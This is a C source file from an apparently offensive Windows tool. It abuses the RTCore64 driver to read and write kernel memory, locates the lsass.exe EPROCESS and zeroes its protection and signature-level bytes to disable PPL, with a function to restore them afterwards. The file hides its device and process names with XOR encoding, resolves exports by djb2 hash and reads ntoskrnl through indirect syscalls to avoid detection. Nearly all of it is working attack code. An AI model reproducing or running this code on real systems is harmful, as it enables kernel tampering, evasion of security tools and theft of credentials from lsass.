#include "memory.h"
#include "api.h"
#include "defs.h"
#include "driver.h"
#include "logger.h"
#include "nocrt.h"
#include "offsets.h"
#include "osinfo.h"
#include "utils.h"

#include "engine.h"

#ifndef OBJ_CASE_INSENSITIVE
#define OBJ_CASE_INSENSITIVE 0x00000040L
#endif

#ifndef FILE_SYNCHRONOUS_IO_NONALERT
#define FILE_SYNCHRONOUS_IO_NONALERT 0x00000020
#endif

typedef struct _IO_STATUS_BLOCK {
  union {
    NTSTATUS Status;
    PVOID Pointer;
  } DUMMYUNIONNAME;
  ULONG_PTR Information;
} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;

// Define function pointers for the required syscalls
typedef NTSTATUS(NTAPI *fnNtOpenFile)(PHANDLE FileHandle,
                                      ACCESS_MASK DesiredAccess,
                                      POBJECT_ATTRIBUTES ObjectAttributes,
                                      PIO_STATUS_BLOCK IoStatusBlock,
                                      ULONG ShareAccess, ULONG OpenOptions);
typedef NTSTATUS(NTAPI *fnNtReadFile)(HANDLE FileHandle, HANDLE Event,
                                      PVOID ApcRoutine, PVOID ApcContext,
                                      PIO_STATUS_BLOCK IoStatusBlock,
                                      PVOID Buffer, ULONG Length,
                                      PLARGE_INTEGER ByteOffset, PULONG Key);
typedef NTSTATUS(NTAPI *fnNtClose)(HANDLE Handle);

extern SYSCALL_LIST SyscallList;
extern void Fnc0000();

// =====================================================
// Memory Access Primitives via RTCore64
// =====================================================

#if defined(__STDC_VERSION__) && __STDC_VERSION__ >= 201112L
_Static_assert(sizeof(RTCORE64_MSR_READ) == 12,
               "sizeof RTCORE64_MSR_READ must be 12 bytes");
_Static_assert(sizeof(RTCORE64_MEMORY_READ) == 48,
               "sizeof RTCORE64_MEMORY_READ must be 48 bytes");
_Static_assert(sizeof(RTCORE64_MEMORY_WRITE) == 48,
               "sizeof RTCORE64_MEMORY_WRITE must be 48 bytes");
#endif

DWORD ReadMemoryPrimitive(HANDLE Device, DWORD Size, DWORD64 Address) {
  RTCORE64_MEMORY_READ memRead = {0};
  memRead.Address = Address;
  memRead.ReadSize = Size;
  DWORD BytesReturned;
  pDIOC(Device, RTC64_MEMORY_READ_CODE, &memRead, sizeof(memRead), &memRead,
        sizeof(memRead), &BytesReturned, NULL);
  return memRead.Value;
}

void WriteMemoryPrimitive(HANDLE Device, DWORD Size, DWORD64 Address,
                          DWORD Value) {
  RTCORE64_MEMORY_WRITE memWrite = {0};
  memWrite.Address = Address;
  memWrite.ReadSize = Size;
  memWrite.Value = Value;
  DWORD BytesReturned;
  pDIOC(Device, RTC64_MEMORY_WRITE_CODE, &memWrite, sizeof(memWrite), &memWrite,
        sizeof(memWrite), &BytesReturned, NULL);
}

WORD ReadMemoryWORD(HANDLE Device, DWORD64 Address) {
  return (WORD)(ReadMemoryPrimitive(Device, 2, Address) & 0xffff);
}

DWORD ReadMemoryDWORD(HANDLE Device, DWORD64 Address) {
  return ReadMemoryPrimitive(Device, 4, Address);
}

DWORD64 ReadMemoryDWORD64(HANDLE Device, DWORD64 Address) {
  return (((DWORD64)ReadMemoryDWORD(Device, Address + 4)) << 32) |
         ReadMemoryDWORD(Device, Address);
}

void WriteMemoryDWORD64(HANDLE Device, DWORD64 Address, DWORD64 Value) {
  WriteMemoryPrimitive(Device, 4, Address, (DWORD)(Value & 0xffffffff));
  WriteMemoryPrimitive(Device, 4, Address + 4, (DWORD)(Value >> 32));
}

// Helper function to read a memory buffer in 4-byte chunks
BOOL ReadMemoryBuffer(HANDLE Device, DWORD64 Address, void *Buffer,
                      DWORD BufferSize) {
  DWORD numDwords = BufferSize / 4;
  DWORD remainder = BufferSize % 4;
  for (DWORD i = 0; i < numDwords; i++) {
    ((DWORD *)Buffer)[i] = ReadMemoryDWORD(Device, Address + i * 4);
  }
  if (remainder) {
    DWORD value =
        ReadMemoryPrimitive(Device, remainder, Address + numDwords * 4);
    memcpy((BYTE *)Buffer + numDwords * 4, &value, remainder);
  }
  return TRUE;
}

// =====================================================
// Functions to disable PPL on lsass.exe
// =====================================================

BYTE OriginalSigLv = 0x00;
BYTE OriginalSecSigLv = 0x00;
BYTE OriginalProt = 0x00;
DWORD64 SavedEproc = 0;

DWORD RvaToFileOffset(PIMAGE_NT_HEADERS pNtHeaders, DWORD dwRva) {
  PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);
  WORD wNumSections = pNtHeaders->FileHeader.NumberOfSections;
  for (WORD i = 0; i < wNumSections; i++) {
    DWORD dwSectionVA = pSectionHeader[i].VirtualAddress;
    DWORD dwSectionSize = pSectionHeader[i].Misc.VirtualSize;
    if (dwRva >= dwSectionVA && dwRva < (dwSectionVA + dwSectionSize)) {
      return dwRva - dwSectionVA + pSectionHeader[i].PointerToRawData;
    }
  }
  return 0;
}

DWORD GetExportRvaByHash(PVOID pRawPeBuffer, DWORD64 dwTargetHash) {
  PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pRawPeBuffer;
  if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
    return 0;
  PIMAGE_NT_HEADERS pNtHeaders =
      (PIMAGE_NT_HEADERS)((PUINT8)pRawPeBuffer + pDosHeader->e_lfanew);
  if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE)
    return 0;

  DWORD dwExportDirRva =
      pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
          .VirtualAddress;
  if (dwExportDirRva == 0)
    return 0;

  DWORD dwExportDirOffset = RvaToFileOffset(pNtHeaders, dwExportDirRva);
  PIMAGE_EXPORT_DIRECTORY pExportDir =
      (PIMAGE_EXPORT_DIRECTORY)((PUINT8)pRawPeBuffer + dwExportDirOffset);

  PDWORD pAddressOfFunctions =
      (PDWORD)((PUINT8)pRawPeBuffer +
               RvaToFileOffset(pNtHeaders, pExportDir->AddressOfFunctions));
  PDWORD pAddressOfNames =
      (PDWORD)((PUINT8)pRawPeBuffer +
               RvaToFileOffset(pNtHeaders, pExportDir->AddressOfNames));
  PWORD pAddressOfNameOrdinals =
      (PWORD)((PUINT8)pRawPeBuffer +
              RvaToFileOffset(pNtHeaders, pExportDir->AddressOfNameOrdinals));

  for (DWORD i = 0; i < pExportDir->NumberOfNames; i++) {
    DWORD dwNameOffset = RvaToFileOffset(pNtHeaders, pAddressOfNames[i]);
    char *szFunctionName = (char *)((PUINT8)pRawPeBuffer + dwNameOffset);
    DWORD64 dwHash = 0x7734773477347734;
    INT c;
    char *str = szFunctionName;
    while ((c = *str++)) {
      dwHash = ((dwHash << 5) + dwHash) + c;
    }
    if (dwHash == dwTargetHash) {
      WORD wOrdinal = pAddressOfNameOrdinals[i];
      return pAddressOfFunctions[wOrdinal];
    }
  }
  return 0;
}

void disablePPL() {
  Offsets offs = getOffsets();
  if (offs.ActiveProcessLinks == 0 || offs.ImageFileName == 0 ||
      offs.Protection == 0) {
    log_error("Offset not mapped... exiting!");
    ExitProcess(1);
  }

  // \\.\RTCore64
  const unsigned char dev_enc[] = {0x6C, 0x6D, 0x1C, 0x6F, 0x66, 0x61,
                                   0x75, 0x58, 0x4A, 0x5C, 0x57, 0x56};
  char *dev_path =
      xor_decrypt_string(dev_enc, sizeof(dev_enc), XOR_KEY, key_len);

  HANDLE Device = pCFA(dev_path, GENERIC_READ | GENERIC_WRITE, 0, NULL,
                       OPEN_EXISTING, 0, NULL);
  custom_free(dev_path);

  if (Device == INVALID_HANDLE_VALUE) {
    log_error("Unable to obtain a handle to the device object");
    return;
  }
  log_info("Device handle obtained");

  DWORD64 ntBase = getKBAddr();
  log_info("Ker base address: 0x%llx", ntBase);

  // LoadLibraryW("ntoskrnl.exe") via Syscalls
  // The path must be an NT path for NtOpenFile
  UNICODE_STRING usNtPath;
  usNtPath.Buffer = L"\\??\\C:\\Windows\\System32\\ntoskrnl.exe";
  USHORT strLen = 0;
  while (usNtPath.Buffer[strLen] != L'\0') {
    strLen++;
  }
  usNtPath.Length = strLen * 2;
  usNtPath.MaximumLength = usNtPath.Length + 2;

  OBJECT_ATTRIBUTES oaNtFile;
  InitializeObjectAttributes(&oaNtFile, &usNtPath, OBJ_CASE_INSENSITIVE, NULL,
                             NULL);

  IO_STATUS_BLOCK ioStatusBlock;
  HANDLE hFile = NULL;
  DWORD64 hNtOpenF = djb2((PBYTE) "NtOpenFile");
  DWORD64 hNtReadF = djb2((PBYTE) "NtReadFile");
  DWORD64 hNtCloseS = djb2((PBYTE) "NtClose");

  int idxOpenFile = -1, idxReadFile = -1, idxClose = -1;
  for (DWORD i = 0; i < SyscallList.Count; i++) {
    if (SyscallList.Entries[i].dwHash == hNtOpenF)
      idxOpenFile = (int)i;
    if (SyscallList.Entries[i].dwHash == hNtReadF)
      idxReadFile = (int)i;
    if (SyscallList.Entries[i].dwHash == hNtCloseS)
      idxClose = (int)i;
  }

  if (idxOpenFile == -1 || idxReadFile == -1 || idxClose == -1) {
    log_error("Failed to find required syscalls for stealth file reading.");
    CloseHandle(Device);
    return;
  }

  PBYTE pStubBase = (PBYTE)&Fnc0000;
  fnNtOpenFile pNtOpenFile = (fnNtOpenFile)(pStubBase + (idxOpenFile * 16));
  fnNtReadFile pNtReadFile = (fnNtReadFile)(pStubBase + (idxReadFile * 16));
  fnNtClose pNtClose = (fnNtClose)(pStubBase + (idxClose * 16));

  NTSTATUS status = ExecuteSyscall(
      pNtOpenFile, Mask_Worker, &hFile, FILE_READ_DATA | SYNCHRONIZE, &oaNtFile,
      &ioStatusBlock, FILE_SHARE_READ, FILE_SYNCHRONOUS_IO_NONALERT);
  if (status != 0) {
    log_error("NtOpenFile failed: 0x%X", status);
    CloseHandle(Device);
    return;
  }

  // Allocate a heap buffer (approx 15MB is usually enough for ntoskrnl)
  DWORD fileSize = 15000000;
  PVOID pBuffer = custom_malloc(fileSize);
  if (!pBuffer) {
    log_error("Failed to allocate memory for raw ntoskrnl disk read.");
    ExecuteSyscall(pNtClose, Mask_Worker, hFile);
    CloseHandle(Device);
    return;
  }

  // Read the raw bytes into the buffer
  LARGE_INTEGER byteOffset;
  byteOffset.QuadPart = 0;

  status = ExecuteSyscall(pNtReadFile, Mask_Worker, hFile, NULL, NULL, NULL,
                          &ioStatusBlock, pBuffer, fileSize, &byteOffset, NULL);

  ExecuteSyscall(pNtClose, Mask_Worker, hFile);

  if (status != 0) {
    log_error("NtReadFile failed: 0x%X", status);
    custom_free(pBuffer);
    CloseHandle(Device);
    return;
  }

  log_info("ntoskrnl.exe read securely into Heap at %p", pBuffer);

  // Get raw RVA offset for "PsInitialSystemProcess" using our djb2
  const unsigned char ps_enc[] = {
      0x60, 0x42, 0x7B, 0x5D, 0x5D, 0x41, 0x5F, 0x56, 0x54, 0x6A, 0x18,
      0x11, 0x17, 0x01, 0x08, 0x36, 0x15, 0x07, 0x0A, 0x0F, 0x43, 0x42};
  char *ps_str = xor_decrypt_string(ps_enc, sizeof(ps_enc), XOR_KEY, key_len);

  DWORD64 psHashTarget = djb2((PBYTE)ps_str);
  DWORD64 ps_offset = GetExportRvaByHash(pBuffer, psHashTarget);

  custom_free(ps_str);
  custom_free(pBuffer);

  if (ps_offset == 0) {
    log_error("Failed to find PsInitialSystemProcess RVA via PE parsing.");
    CloseHandle(Device);
    return;
  }

  DWORD64 sys_eproc = ReadMemoryDWORD64(Device, ntBase + ps_offset);
  // log_info("PsInitialSystemProcess (EPROCESS) address: 0x%llx", sys_eproc);
  log_info("System entry address: 0x%llx", sys_eproc);

  DWORD64 list_head = sys_eproc + offs.ActiveProcessLinks;
  DWORD64 curr_entry = ReadMemoryDWORD64(Device, list_head);

  while (curr_entry != list_head) {
    DWORD64 eproc = curr_entry - offs.ActiveProcessLinks;
    char name[16] = {0};
    ReadMemoryBuffer(Device, eproc + offs.ImageFileName, name, 15);
    name[15] = '\0';

    // "lsass.exe"
    const unsigned char ls_enc[] = {0x5C, 0x42, 0x53, 0x40, 0x47,
                                    0x1B, 0x53, 0x4F, 0x5D};
    char *target = xor_decrypt_string(ls_enc, sizeof(ls_enc), XOR_KEY, key_len);

    if (custom_stricmp(name, target) == 0) {
      custom_free(target);
      log_info("Found EPROC at 0x%llx", eproc);

      // Save EPROCESS address
      SavedEproc = eproc;

      log_info("Original protection values:");
      OriginalSigLv =
          (BYTE)ReadMemoryPrimitive(Device, 1, eproc + offs.Protection - 2);
      log_info("\tSigLv value: 0x%02X", OriginalSigLv);
      OriginalSecSigLv =
          (BYTE)ReadMemoryPrimitive(Device, 1, eproc + offs.Protection - 1);
      log_info("\tSecSigLv value: 0x%02X", OriginalSecSigLv);
      OriginalProt =
          (BYTE)ReadMemoryPrimitive(Device, 1, eproc + offs.Protection);
      log_info("\tProt value: 0x%02X", OriginalProt);

      // Disable
      WriteMemoryPrimitive(Device, 1, eproc + offs.Protection - 2,
                           0x00); // SignatureLevel
      WriteMemoryPrimitive(Device, 1, eproc + offs.Protection - 1,
                           0x00); // SectionSignatureLevel
      WriteMemoryPrimitive(Device, 1, eproc + offs.Protection,
                           0x00); // Protection
      log_success("PPL disabled (0x00 written)");

      BYTE post =
          (BYTE)ReadMemoryPrimitive(Device, 1, eproc + offs.Protection - 2);
      log_info("\tSigLv value after write: 0x%02X", post);

      post = (BYTE)ReadMemoryPrimitive(Device, 1, eproc + offs.Protection - 1);
      log_info("\tSecSigLv value after write: 0x%02X", post);

      post = (BYTE)ReadMemoryPrimitive(Device, 1, eproc + offs.Protection);
      log_info("\tProt value after write: 0x%02X", post);

      break;
    }
    custom_free(target);
    curr_entry = ReadMemoryDWORD64(Device, curr_entry);
  }

  CloseHandle(Device);
}

void restorePPL() {
  if (SavedEproc == 0) {
    log_error("No saved EPRO found. Run disablePPL() first.");
    return;
  }

  Offsets offs = getOffsets();
  if (offs.Protection == 0) {
    log_error("Offset 'Prot' not mapped... exiting!");
    ExitProcess(1);
  }

  // \\.\RTCore64
  const unsigned char dev_enc[] = {0x6C, 0x6D, 0x1C, 0x6F, 0x66, 0x61,
                                   0x75, 0x58, 0x4A, 0x5C, 0x57, 0x56};
  char *dev_path =
      xor_decrypt_string(dev_enc, sizeof(dev_enc), XOR_KEY, key_len);

  HANDLE Device = pCFA(dev_path, GENERIC_READ | GENERIC_WRITE, 0, NULL,
                       OPEN_EXISTING, 0, NULL);
  custom_free(dev_path);

  if (Device == INVALID_HANDLE_VALUE) {
    log_error("Unable to obtain a handle to the device object");
    return;
  }
  log_info("Device handle obtained for restoration");

  // Restore protections
  WriteMemoryPrimitive(Device, 1, SavedEproc + offs.Protection - 2,
                       OriginalSigLv);
  WriteMemoryPrimitive(Device, 1, SavedEproc + offs.Protection - 1,
                       OriginalSecSigLv);
  WriteMemoryPrimitive(Device, 1, SavedEproc + offs.Protection, OriginalProt);

  log_success("PPL restored to original value:");

  BYTE post =
      (BYTE)ReadMemoryPrimitive(Device, 1, SavedEproc + offs.Protection - 2);
  log_info("\tSigLv value after write: 0x%02X", post);
  post = (BYTE)ReadMemoryPrimitive(Device, 1, SavedEproc + offs.Protection - 1);
  log_info("\tSecSigLv value after write: 0x%02X", post);
  post = (BYTE)ReadMemoryPrimitive(Device, 1, SavedEproc + offs.Protection);
  log_info("\tProt value after write: 0x%02X", post);

  CloseHandle(Device);
}
